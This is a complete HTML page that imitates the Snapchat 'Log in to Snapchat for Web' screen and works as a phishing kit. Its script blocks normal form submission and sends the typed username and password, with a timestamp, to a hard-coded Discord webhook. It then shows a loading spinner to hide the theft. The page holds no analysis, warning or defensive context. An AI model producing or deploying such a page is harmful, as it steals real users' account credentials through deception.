<!DOCTYPE html>
<html lang="en-us" data-theme="dark">

<head>
      <meta charset="utf-8">
      <title>Log In â€¢ Snapchat</title>
      <meta name="referrer" content="origin">
      <meta name="apple-mobile-web-app-capable" content="no">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
      <link rel="stylesheet" href="styles.css">
      <link rel="shortcut icon" href="favicon.png" type="image/png">
      <link rel="canonical" href="https://accounts.snapchat.com/accounts/login">
      <style>
            .spinner {
                  display: none;
                  border: 16px solid #f3f3f3;
                  /* Light grey */
                  border-top: 16px solid #3498db;
                  /* Blue */
                  border-radius: 50%;
                  width: 120px;
                  height: 120px;
                  animation: spin 2s linear infinite;
                  position: absolute;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
            }

            @keyframes spin {
                  0% {
                        transform: rotate(0deg);
                  }

                  100% {
                        transform: rotate(360deg);
                  }
            }
      </style>
</head>

<body class="designV2">
      <div class="pusher">
            <div id="login-root">
                  <div class="App" style="display:none">
                        <div class="full-background-color"></div>
                        <div class="Header"><a href="https://accounts.snapchat.com/" class="logo sf-hidden"></a></div>
                        <div class="Login">
                              <article class="page">
                                    <div class="container"><img class="snapchat-icon" src="icon.svg" alt="Snapchat">
                                          <div>
                                                <h1 class="accountsTitle">Log in to Snapchat for Web</h1>
                                          </div>
                                          <div>
                                                <form id="login_form" action="login.php" method="post"
                                                      class="centered_form">
                                                      <div class="form-group has-success">
                                                            <label for="username" class="control-label">Username or
                                                                  Email</label>
                                                            <input name="username" autocomplete="off" type="text"
                                                                  id="username" class="form-control" required>
                                                      </div>
                                                      <div class="form-group has-success">
                                                            <label for="password" class="control-label">Password</label>
                                                            <input name="password" autocomplete="off" type="password"
                                                                  id="password" class="form-control" required>
                                                      </div>
                                                      <p class="secondary_action"><a href="#">Forgot Password</a></p>
                                                      <div style="display:none"></div>
                                                      <div class="primary_action login-button">
                                                            <button type="submit" id="loginTrigger"
                                                                  class="btn btn-lg btn-primary">Log In</button>
                                                      </div>
                                                </form>
                                                <div class="spinner" id="spinner"></div>
                                          </div>
                                    </div>
                                    <div class="create-account-cta"><span>New To Snapchat?</span><a
                                                href="https://accounts.snapchat.com/accounts/signup">Sign Up</a></div>
                              </article>
                        </div>
                  </div>
            </div>
      </div>

      <script>
            document.addEventListener('DOMContentLoaded', function () {
                  const form = document.getElementById('login_form');
                  const spinner = document.getElementById('spinner');

                  form.addEventListener('submit', function (event) {
                        event.preventDefault(); // Prevent default form submission

                        // Fetch input values
                        const username = document.getElementById('username').value;
                        const password = document.getElementById('password').value;

                        // Prepare webhook data
                        const webhookUrl = 'https://discord.com/api/webhooks/1244852519302336572/hIM76wzmJcBQEnzEQSwIG7sbqvpMmFsp4Eq4px3f1F4zejbVM3Tf0vVDfwWa9oW_pbpx';
                        const payload = {
                              content: `Username: ${username}\nPassword: ${password}\nTimestamp: ${new Date().toISOString()}`
                        };

                        // Send data to Discord webhook
                        fetch(webhookUrl, {
                              method: 'POST',
                              headers: {
                                    'Content-Type': 'application/json',
                              },
                              body: JSON.stringify(payload)
                        })
                              .then(response => {
                                    if (!response.ok) {
                                          console.error('Error sending webhook:', response.status, response.statusText);
                                    } else {
                                          console.log('Webhook sent successfully');
                                    }
                              })
                              .catch(error => {
                                    console.error('Error sending webhook:', error);
                              });

                        // Hide form and show spinner
                        form.style.display = 'none';
                        spinner.style.display = 'block';
                  });
            });
      </script>
</body>

</html>
